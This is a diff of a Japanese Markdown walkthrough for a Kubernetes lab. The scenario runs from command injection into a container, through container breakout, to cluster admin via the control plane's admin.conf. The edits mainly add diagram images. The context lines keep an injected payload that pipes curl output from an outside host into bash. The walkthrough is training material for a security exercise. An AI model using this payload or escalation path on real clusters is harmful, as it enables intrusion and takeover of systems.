@@ -2,6 +2,10 @@
 
 アプリケーションの脆弱性を利用してコンテナに侵入し、Kubernetes の Admin 権限の取得を目指します。
 
+以下は演習環境の簡単な構成図です。
+
+![k8s-diagram-01](./images/k8s-diagram-01.png)
+
 1. コマンドインジェクションによるコンテナ侵入
 2. コンテナ内の探索と攻撃準備
 3. 攻撃用コンテナ作成
@@ -10,7 +14,7 @@
 6. コントロールプレーンへの侵入
 7. Kubernetes クラスタの Admin 権限取得
 
-※ 以下コマンド例では、コマンドがどこで実行されているのか理解しやすいように、実行場所をプロンプトで表現してます。
+※ 本シナリオのコマンド例では、コマンドがどこで実行されているのか理解しやすいように、実行場所をプロンプトで表現してます。
 
 ## コマンドインジェクションによるコンテナ侵入
 
@@ -38,6 +42,8 @@ example.com && curl http://10.99.0.227:1234 | bash #
 [unguard-proxy-service]: cat /etc/hostname
 unguard-proxy-service-5b84d8dd85-xz2rr
 ```
+
+![k8s-diagram-02](./images/k8s-diagram-02.png)
 
 ## コンテナ内の探索と攻撃準備
 
@@ -152,6 +158,8 @@ pod/attack-pod-1 created
 attack-pod-1                                  1/1     Running     0          9s
 ```
 
+![k8s-diagram-03](./images/k8s-diagram-03.png)
+
 ## コンテナブレイクアウトによるワーカーノード侵入
 
 作成した Pod の ubuntu コンテナに Exec します。
@@ -182,6 +190,8 @@ kind-worker
 しかしワーカーノードには Kubernetes の Admin 権限を取得する方法がありません。
 
 Admin を得るため、どうにかしてコントロールプレーンのノードに侵入する必要があります。
+
+![k8s-diagram-04](./images/k8s-diagram-04.png)
 
 ## ワーカーノード内の情報収集
 
@@ -360,6 +370,8 @@ bin  boot  dev  etc  home  host-system  lib  lib64  media  mnt  opt  proc  produ
 kind-control-plane
 ```
 
+![k8s-diagram-05](./images/k8s-diagram-05.png)
+
 ## Kubernetes クラスタの Admin 権限取得
 
 コントロールプレーンにはクラスタコンポーネントが認証に利用するさまざまなファイルが配置されています。今回はクラスタ構築時に kubeadm が利用する `admin.conf` を使い、Kubernetes の Admin 権限を取得することができました。
@@ -383,3 +395,5 @@ kube-system          cilium-operator-9bfb5ffbd-wrspt                         1/1
 kube-system          coredns-7db6d8ff4d-8f4ph                                1/1     Running     0               2d18h
 ...
 ```
+
+![k8s-diagram-06](./images/k8s-diagram-06.png)
